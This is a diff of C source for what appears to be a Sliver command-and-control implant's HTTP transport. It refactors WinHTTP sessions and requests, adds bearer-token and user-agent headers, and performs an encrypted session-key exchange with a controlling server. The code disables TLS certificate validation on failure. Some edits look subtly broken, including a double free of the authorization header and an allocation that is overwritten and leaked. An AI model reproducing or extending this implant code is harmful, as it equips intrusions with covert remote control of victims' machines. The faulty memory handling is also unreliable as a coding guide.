@@ -296,6 +296,8 @@ PHTTP_SESSION HttpSessionInit
 	LPWSTR lpHostName = NULL;
 
 	Result = ALLOC(sizeof(HTTP_SESSION));
+	RtlSecureZeroMemory(&ProxyDefault, sizeof(ProxyDefault));
+	RtlSecureZeroMemory(&ProxyIE, sizeof(ProxyIE));
 	if (pProxyInfo == NULL) {
 		dwAccessType = WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;
 		lpProxyName = WINHTTP_NO_PROXY_NAME;
@@ -342,22 +344,22 @@ PHTTP_SESSION HttpSessionInit
 			lpHostName = ConvertCharToWchar(pProxyInfo->pUri->lpHostName);
 			lpProxyName = ALLOC((lstrlenW(lpHostName) + 10) * sizeof(WCHAR));
 			wsprintfW(lpProxyName, L"%lls:%d", lpHostName, pProxyInfo->pUri->wPort);
-			FREE(lpHostName);
 		}
 	}
 
 	Result->hSession = WinHttpOpen(NULL, dwAccessType, lpProxyName, lpProxyBypass, 0);
 	if (!Result->hSession) {
-		wprintf(L"WinHttpOpen failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
-		if (Result->lpProxyAutoConfigUrl != NULL) {
-			FREE(Result->lpProxyAutoConfigUrl);
-		}
-
-		FREE(Result);
-		goto END;
+		LogError(L"WinHttpOpen failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		FreeHttpSession(Result);
+		Result = NULL;
+		goto CLEANUP;
 	}
 
-END:
+CLEANUP:
+	if (lpHostName != NULL) {
+		FREE(lpHostName);
+	}
+
 	if (lpProxyName != NULL) {
 		FREE(lpProxyName);
 	}
@@ -380,16 +382,16 @@ PHTTP_CLIENT HttpClientInit
 	
 	lpHostName = ConvertCharToWchar(pUri->lpHostName);
 	Result = ALLOC(sizeof(HTTP_CLIENT));
-	Result->pProxyConfig = pProxyConfig;
 	Result->pUri = pUri;
 	Result->pHttpSession = HttpSessionInit(pProxyConfig);
 	Result->hConnection = WinHttpConnect(Result->pHttpSession->hSession, lpHostName, pUri->wPort, 0);
 	if (Result->hConnection == NULL) {
 		wprintf(L"WinHttpConnect failed at %lls. Last error: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		FreeHttpClient(Result);
+		Result = NULL;
 	}
 
 	FREE(lpHostName);
-
 	return Result;
 }
 
@@ -427,7 +429,7 @@ HINTERNET SendRequest
 (
 	_In_ PHTTP_CLIENT This,
 	_In_ PHTTP_REQUEST pRequest,
-	_In_opt_ LPSTR lpContentType,
+	_In_ DWORD dwNumberOfAttemps,
 	_In_opt_ LPSTR lpData,
 	_In_opt_ DWORD cbData
 )
@@ -453,11 +455,13 @@ HINTERNET SendRequest
 	hRequest = WinHttpOpenRequest(This->hConnection, lpMethod, pPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, dwFlag);
 	if (hRequest == NULL)
 	{
-		goto END;
+		LogError(L"WinHttpOpenRequest failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, dwLastError);
+		goto CLEANUP;
 	}
 
 	if (!WinHttpSetTimeouts(hRequest, pRequest->dwResolveTimeout, pRequest->dwConnectTimeout, pRequest->dwSendTimeout, pRequest->dwReceiveTimeout)) {
-		goto END;
+		LogError(L"WinHttpSetTimeouts failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, dwLastError);
+		goto CLEANUP;
 	}
 
 	for (i = 0; i < _countof(pRequest->Headers); i++) {
@@ -471,11 +475,7 @@ HINTERNET SendRequest
 		WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY, pProxyInfo, sizeof(WINHTTP_PROXY_INFO));
 	}
 
-	
-	if (lpContentType != NULL) {
-		xContentType = DuplicateStrA(lpContentType, 0);
-	}
-	else if (pRequest->ContentTy != NULL) {
+	if (pRequest->ContentTy != NULL) {
 		xContentType = DuplicateStrA(pRequest->ContentTy, 0);
 	}
 
@@ -490,29 +490,35 @@ HINTERNET SendRequest
 
 	while (!WinHttpSendRequest(hRequest, NULL, 0, xData, xDataSize, xDataSize, NULL)) {
 		dwLastError = GetLastError();
-		wprintf(L"WinHttpSendRequest failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, dwLastError);
-		if (dwLastError == ERROR_WINHTTP_RESEND_REQUEST)
-		{
+		LogError(L"WinHttpSendRequest failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, dwLastError);
+		if (dwLastError == ERROR_WINHTTP_RESEND_REQUEST) {
 			continue;
 		}
 
 		if (dwLastError == ERROR_WINHTTP_SECURE_FAILURE) {
 			dwFlag = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
 			if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlag, sizeof(dwFlag))) {
-				wprintf(L"WinHttpSetOption failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+				LogError(L"WinHttpSetOption failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
 				hRequest = NULL;
-				goto END;
+				goto CLEANUP;
 			}
+		}
+
+		i++;
+		if (i > dwNumberOfAttemps) {
+			hRequest = NULL;
+			goto CLEANUP;
 		}
 	}
 
 	if (!WinHttpReceiveResponse(hRequest, NULL)) {
-		wprintf(L"WinHttpReceiveResponse failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
-		goto END;
+		hRequest = NULL;
+		LogError(L"WinHttpReceiveResponse failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		goto CLEANUP;
 	}
 
-END:
-	if (lpContentType != NULL) {
+CLEANUP:
+	if (xContentType != NULL) {
 		FREE(xContentType);
 	}
 
@@ -667,10 +673,11 @@ VOID FreeHttpClient
 	if (pHttpClient != NULL) {
 		FreeUri(pHttpClient->pUri);
 		FreeHttpSession(pHttpClient->pHttpSession);
-		FreeWebProxy(pHttpClient->pProxyConfig);
 		if (pHttpClient->hConnection != NULL) {
 			WinHttpCloseHandle(pHttpClient->hConnection);
 		}
+
+		FREE(pHttpClient);
 	}
 }
 
@@ -771,36 +778,23 @@ VOID FreeSliverHttpClient
 	FREE(pClient);
 }
 
-PURI StartSessionURL
-(
-	_In_ PSLIVER_HTTP_CLIENT pClient
-);
-
 PHTTP_REQUEST CreateHttpRequest
 (
-	_In_ PDRIVE_CONFIG This,
+	_In_ PHTTP_CONFIG pHttpConfig,
 	_In_ HttpMethod Method,
-	_In_ DWORD dwResolveTimeout,
-	_In_ DWORD dwConnectTimeout,
-	_In_ DWORD dwSendTimeout,
-	_In_ DWORD dwReceiveTimeout,
 	_In_ LPSTR lpContentType,
 	_In_ LPSTR lpData,
-	_In_ DWORD cbData,
-	_In_ BOOL SetAuthorizationHeader,
-	_In_ LPSTR* pHeaders
+	_In_ DWORD cbData
 )
 {
 	PHTTP_REQUEST Result = NULL;
-	LPSTR lpAuthorizationHeader = NULL;
-	LPSTR lpUserAgent = NULL;
 	DWORD i = 0;
 
 	Result = ALLOC(sizeof(HTTP_REQUEST));
-	Result->dwConnectTimeout = dwConnectTimeout;
-	Result->dwResolveTimeout = dwResolveTimeout;
-	Result->dwSendTimeout = dwSendTimeout;
-	Result->dwReceiveTimeout = dwReceiveTimeout;
+	Result->dwConnectTimeout = pHttpConfig->dwConnectTimeout;
+	Result->dwResolveTimeout = pHttpConfig->dwResolveTimeout;
+	Result->dwSendTimeout = pHttpConfig->dwSendTimeout;
+	Result->dwReceiveTimeout = pHttpConfig->dwReceiveTimeout;
 	if (lpContentType != NULL) {
 		Result->ContentTy = DuplicateStrA(lpContentType, 0);
 	}
@@ -812,24 +806,6 @@ PHTTP_REQUEST CreateHttpRequest
 	}
 
 	Result->Method = Method;
-	if (pHeaders != NULL) {
-		for (i = 0; i < HeaderEnumEnd; i++) {
-			if (pHeaders != NULL) {
-				Result->Headers[i] = pHeaders[i];
-			}
-		}
-	}
-
-	if (SetAuthorizationHeader) {
-		lpAuthorizationHeader = ALLOC(lstrlenA("Bearer ") + lstrlenA(This->lpAccessToken) + 1);
-		StrCpyA(lpAuthorizationHeader, "Bearer ");
-		StrCatA(lpAuthorizationHeader, This->lpAccessToken);
-		Result->Headers[Authorization] = lpAuthorizationHeader;
-	}
-
-	lpUserAgent = DuplicateStrA(This->HttpConfig.lpUserAgent, 0);
-	Result->Headers[UserAgent] = lpUserAgent;
-
 	return Result;
 }
 
@@ -853,9 +829,9 @@ VOID FreeHttpResp
 
 PHTTP_RESP SendHttpRequest
 (
-	_In_ PHTTP_CONFIG This,
+	_In_ PHTTP_CONFIG pHttpConfig,
+	_In_ PHTTP_CLIENT pHttpClient,
 	_In_ HttpMethod Method,
-	_In_ LPSTR lpUrl,
 	_In_ LPSTR lpContentType,
 	_In_ LPSTR lpData,
 	_In_ DWORD cbData,
@@ -863,69 +839,79 @@ PHTTP_RESP SendHttpRequest
 	_In_ BOOL GetRespData
 )
 {
-	PHTTP_CLIENT pHttpClient = NULL;
 	PHTTP_REQUEST pHttpRequest = NULL;
 	HINTERNET hRequest = NULL;
 	DWORD dwStatusCode = 0;
-	LPSTR Headers[HeaderEnumEnd];
 	DWORD i = 0;
 	DWORD cbResp = 0;
 	PHTTP_RESP pResult = NULL;
+	LPSTR lpAuthorizationHeader = NULL;
 
-	RtlSecureZeroMemory(Headers, sizeof(Headers));
-	pHttpClient = HttpClientInit(UriInit(lpUrl), This->pProxyConfig);
-	if (pHttpClient == NULL) {
-		goto END;
-	}
-
-	for (i = 0; i < _countof(Headers); i++) {
-		if (This->AdditionalHeaders[i] != NULL) {
-			Headers[i] = DuplicateStrA(This->AdditionalHeaders[i], 0);
+	pHttpRequest = CreateHttpRequest(pHttpConfig, Method, lpContentType, lpData, cbData);
+	if (pHttpRequest != NULL) {
+		for (i = 0; i < HeaderEnumEnd; i++) {
+			pHttpRequest->Headers[i] = DuplicateStrA(pHttpConfig->AdditionalHeaders[i], 0);
 		}
 	}
 
-	if (!pHttpClient->pUri->bUseHttps && !This->DisableUpgradeHeader) {
-		Headers[UpgradeInsecureRequests] = DuplicateStrA("1", 0);
+	if (pHttpRequest->Headers[UserAgent] != NULL) {
+		FREE(pHttpRequest->Headers[UserAgent]);
+	}
+
+	pHttpRequest->Headers[UserAgent] = DuplicateStrA(pHttpConfig->lpUserAgent, 0);
+	if (SetAuthorizationHeader) {
+		lpAuthorizationHeader = ALLOC(lstrlenA("Bearer ") + lstrlenA(pHttpConfig->lpAccessToken) + 1);
+		StrCpyA(lpAuthorizationHeader, "Bearer ");
+		StrCatA(lpAuthorizationHeader, pHttpConfig->lpAccessToken);
+		if (pHttpRequest->Headers[Authorization] != NULL) {
+			FREE(pHttpRequest->Headers[Authorization]);
+		}
+
+		pHttpRequest->Headers[Authorization] = lpAuthorizationHeader;
+	}
+
+	if (!pHttpClient->pUri->bUseHttps && !pHttpConfig->DisableUpgradeHeader) {
+		if (pHttpRequest->Headers[UpgradeInsecureRequests] != NULL) {
+			FREE(pHttpRequest->Headers[UpgradeInsecureRequests]);
+		}
+
+		pHttpRequest->Headers[UpgradeInsecureRequests] = DuplicateStrA("1", 0);
+	}
+
+	hRequest = SendRequest(pHttpClient, pHttpRequest, NULL, NULL, 0);
+	if (hRequest == NULL) {
+		goto CLEANUP;
 	}
 
 	pResult = ALLOC(sizeof(HTTP_RESP));
-	while (TRUE) {
-		pHttpRequest = CreateHttpRequest(This, Method, 0, 0, 0, 0, lpContentType, lpData, cbData, TRUE, NULL);
-		hRequest = SendRequest(pHttpClient, pHttpRequest, NULL, NULL, 0);
-		dwStatusCode = ReadStatusCode(hRequest);
-		if (dwStatusCode == OK && GetRespData) {
-			if (!ReceiveData(hRequest, &pResult->pRespData, &cbResp)) {
-				if (pResult->pRespData != NULL) {
-					FREE(pResult->pRespData);
-					pResult->pRespData = NULL;
-				}
-
-				cbResp = 0;
+	dwStatusCode = ReadStatusCode(hRequest);
+	if (dwStatusCode == OK && GetRespData) {
+		if (!ReceiveData(hRequest, &pResult->pRespData, &cbResp)) {
+			if (pResult->pRespData != NULL) {
+				FREE(pResult->pRespData);
+				pResult->pRespData = NULL;
 			}
-		}
-		else {
-			LogError(L"Status code: %d at %lls\n", dwStatusCode, __FUNCTIONW__);
-			if (dwStatusCode == Unauthorized) {
-				RefreshAccessToken(This);
-			}
-		}
 
-		break;
+			cbResp = 0;
+		}
 	}
-
+	else if (dwStatusCode != OK) {
+		LogError(L"Status code: %d at %lls\n", dwStatusCode, __FUNCTIONW__);
+	}
+	
 	pResult->hRequest = hRequest;
 	pResult->cbResp = cbResp;
 	pResult->dwStatusCode = dwStatusCode;
-END:
-	for (i = 0; i < _countof(Headers); i++) {
-		if (Headers[i] != NULL) {
-			FREE(Headers);
-		}
+CLEANUP:
+	if (lpAuthorizationHeader != NULL) {
+		FREE(lpAuthorizationHeader);
+	}
+
+	if (lpAuthorizationHeader != NULL) {
+		FREE(lpAuthorizationHeader);
 	}
 
 	FreeHttpRequest(pHttpRequest);
-	FreeHttpClient(pHttpClient);
-
 	return pResult;
 };
 
@@ -1346,7 +1332,6 @@ PBYTE SessionDecrypt
 	_In_ PSLIVER_HTTP_CLIENT pClient,
 	_In_ PBYTE pMessage,
 	_In_ DWORD cbMessage,
-	_In_ LPSTR lpServerMinisignPubKey,
 	_Out_ PDWORD pcbPlainText
 )
 {
@@ -1361,7 +1346,7 @@ PBYTE SessionDecrypt
 		goto CLEANUP;
 	}
 
-	pDecodedPubKey = DecodeMinisignPublicKey(lpServerMinisignPubKey);
+	pDecodedPubKey = DecodeMinisignPublicKey(pClient->lpServerMinisignPublicKey);
 	if (pDecodedPubKey == NULL) {
 		goto CLEANUP;
 	}
@@ -1373,7 +1358,7 @@ PBYTE SessionDecrypt
 	pNonce = pMessage + MINISIGN_SIZE;
 	pCipherText = pNonce + CHACHA20_NONCE_SIZE;
 	cbCipherText = cbMessage - MINISIGN_SIZE - CHACHA20_NONCE_SIZE;
-	pResult = ALLOC(cbCipherText + 1);
+	pResult = ALLOC(cbCipherText);
 	pResult = Chacha20Poly1305DecryptAndVerify(pClient->pSessionKey, pNonce, pCipherText, cbCipherText, NULL, 0, &cbPlainText);
 	if (pResult == NULL || cbPlainText == 0) {
 		goto CLEANUP;
@@ -1394,6 +1379,7 @@ CLEANUP:
 PSLIVER_HTTP_CLIENT SliverSessionInit()
 {
 	LPSTR lpFullUri = NULL;
+	PURI pUri = NULL;
 	DWORD cbResp = 0;
 	PSLIVER_HTTP_CLIENT pSliverClient = NULL;
 	LPSTR lpEncodedSessionKey = NULL;
@@ -1401,6 +1387,10 @@ PSLIVER_HTTP_CLIENT SliverSessionInit()
 	PHTTP_RESP pResp = NULL;
 	PBYTE pDecodedResp = NULL;
 	DWORD cbDecodedResp = NULL;
+	PHTTP_CLIENT pHttpClient = NULL;
+	PWEB_PROXY pProxyConfig = NULL;
+	LPSTR lpSessionId = NULL;
+	DWORD cbSessionId = 0;
 
 	pSliverClient = SliverHttpClientInit();
 	if (pSliverClient == NULL) {
@@ -1412,8 +1402,18 @@ PSLIVER_HTTP_CLIENT SliverSessionInit()
 		goto CLEANUP;
 	}
 
+	pUri = UriInit(lpFullUri);
+	if (pUri == NULL) {
+		goto CLEANUP;
+	}
+
+	pSliverClient->pHttpClient = HttpClientInit(pUri, pSliverClient->HttpConfig.pProxyConfig);
+	if (pSliverClient->pHttpClient == NULL) {
+		goto CLEANUP;
+	}
+
 	lpEncodedSessionKey = Base64Encode(pSliverClient->pSessionKey, pSliverClient->cbSessionKey, FALSE);
-	pResp = SendHttpRequest(&pSliverClient->HttpConfig, POST, lpFullUri, NULL, lpEncodedSessionKey, lstrlenA(lpEncodedSessionKey), TRUE, TRUE);
+	pResp = SendHttpRequest(&pSliverClient->HttpConfig, pSliverClient->pHttpClient, POST, NULL, lpEncodedSessionKey, lstrlenA(lpEncodedSessionKey), FALSE, TRUE);
 	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
 		goto CLEANUP;
 	}
@@ -1423,13 +1423,21 @@ PSLIVER_HTTP_CLIENT SliverSessionInit()
 		goto CLEANUP;
 	}
 
-	
-	/////////////////////////////
+	lpSessionId = SessionDecrypt(pSliverClient, pDecodedResp, cbDecodedResp, &cbSessionId);
+	if (lpSessionId == NULL || cbSessionId == 0) {
+		goto CLEANUP;
+	}
+
+	memcpy(pSliverClient->szSessionID, lpSessionId, cbSessionId);
 	bIsOk = TRUE;
 CLEANUP:
 	if (!bIsOk) {
 		FreeSliverHttpClient(pSliverClient);
 		pSliverClient = NULL;
+	}
+
+	if (lpSessionId != NULL) {
+		FREE(lpSessionId);
 	}
 
 	if (lpEncodedSessionKey != NULL) {
